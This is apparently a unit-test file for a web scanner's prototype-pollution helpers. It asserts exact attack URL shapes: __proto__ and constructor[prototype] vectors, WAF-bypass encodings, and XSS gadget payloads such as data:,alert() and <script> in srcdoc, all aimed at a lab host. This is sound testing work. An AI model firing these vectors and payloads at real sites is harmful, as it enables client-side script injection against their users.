"""Unit tests for the pure, browser-free prototype-pollution helpers (dast.triage.protopollute).

No browser, no network — these assert the sentinel generation, the source-vector URL shapes
(query / hash / nested-merge / WAF-bypass encodings), gadget URL construction, and dialog-marker
matching that the deterministic prototype_pollution_probe relies on.
"""

from __future__ import annotations

from dast.triage import protopollute as pp

_BASE = "https://lab.example.com/"


def test_make_sentinel_unique_and_correlated():
    k1, v1 = pp.make_sentinel()
    k2, v2 = pp.make_sentinel()
    assert k1.startswith("fr_pp_")
    assert v1.startswith("polluted_")
    # key and value share the same random token.
    assert k1[len("fr_pp_"):] == v1[len("polluted_"):]
    # two runs never collide.
    assert k1 != k2 and v1 != v2


def test_source_vectors_order_and_shapes():
    vectors = pp.source_vectors(_BASE, "K", "V")
    labels = [lbl for lbl, _ in vectors]
    assert labels == [
        "proto_query", "constructor_prototype_query", "proto_hash",
        "constructor_prototype_hash", "proto_hash_amp", "proto_nested_query",
        "proto_nested2_query", "proto_encoded_query",
        "constructor_prototype_encoded_query",
    ]
    by = dict(vectors)
    assert by["proto_query"] == "https://lab.example.com/?__proto__[K]=V"
    assert by["constructor_prototype_query"] == "https://lab.example.com/?constructor[prototype][K]=V"
    # fragment (location.hash) vectors
    assert by["proto_hash"] == "https://lab.example.com/#__proto__[K]=V"
    assert by["proto_hash_amp"] == "https://lab.example.com/#x=y&__proto__[K]=V"
    # nested-merge shapes
    assert by["proto_nested_query"] == "https://lab.example.com/?a[__proto__][K]=V"
    assert by["proto_nested2_query"] == "https://lab.example.com/?a[b][__proto__][K]=V"
    # WAF-bypass encodings
    assert by["proto_encoded_query"] == "https://lab.example.com/?__pro%74o__[K]=V"
    assert by["constructor_prototype_encoded_query"] == (
        "https://lab.example.com/?constructor%5bprototype%5d%5bK%5d=V")


def test_source_vectors_strip_existing_query_and_fragment():
    vectors = dict(pp.source_vectors("https://lab.example.com/app?old=1#frag", "K", "V"))
    assert vectors["proto_query"] == "https://lab.example.com/app?__proto__[K]=V"
    assert vectors["proto_hash"] == "https://lab.example.com/app#__proto__[K]=V"


def test_gadget_url_substitutes_property_and_marker():
    gadget = {"name": "transport_url", "property": "transport_url",
              "value": "data:,alert({marker});"}
    url = pp.gadget_url(_BASE, "proto_query", gadget, "999")
    assert url == "https://lab.example.com/?__proto__[transport_url]=data:,alert(999);"


def test_gadget_url_uses_the_source_vector_shape():
    gadget = {"name": "srcdoc", "property": "srcdoc", "value": "<script>alert({marker})</script>"}
    url = pp.gadget_url(_BASE, "proto_hash", gadget, "7")
    assert url == "https://lab.example.com/#__proto__[srcdoc]=<script>alert(7)</script>"


def test_gadget_url_unknown_label_falls_back_to_proto_query():
    gadget = {"name": "x", "property": "p", "value": "alert({marker})"}
    url = pp.gadget_url(_BASE, "no_such_label", gadget, "1")
    assert url == "https://lab.example.com/?__proto__[p]=alert(1)"


def test_marker_in_dialog_matching():
    assert pp.marker_in_dialog({"type": "alert", "message": "pre 4242 post"}, "4242") is True
    assert pp.marker_in_dialog({"type": "alert", "message": "4242"}, "4242") is True
    # bare string message accepted
    assert pp.marker_in_dialog("value is 4242", "4242") is True
    # markerless dialog does not match
    assert pp.marker_in_dialog({"type": "alert", "message": "ambient"}, "4242") is False
    # no dialog / empty marker never match
    assert pp.marker_in_dialog(None, "4242") is False
    assert pp.marker_in_dialog({"message": "4242"}, "") is False


def test_load_gadgets_reads_library():
    gadgets = pp.load_gadgets()
    names = {g.get("name") for g in gadgets}
    # the gadget that solves the PortSwigger client-side proto-pollution lab must be present.
    assert "transport_url" in names
    for g in gadgets:
        assert g.get("property")
        assert "{marker}" in str(g.get("value", ""))


def test_read_proto_js_shape():
    # reads the sentinel key off a FRESH empty object (inherited from Object.prototype).
    assert pp.READ_PROTO_JS == "(k)=>({})[k]"
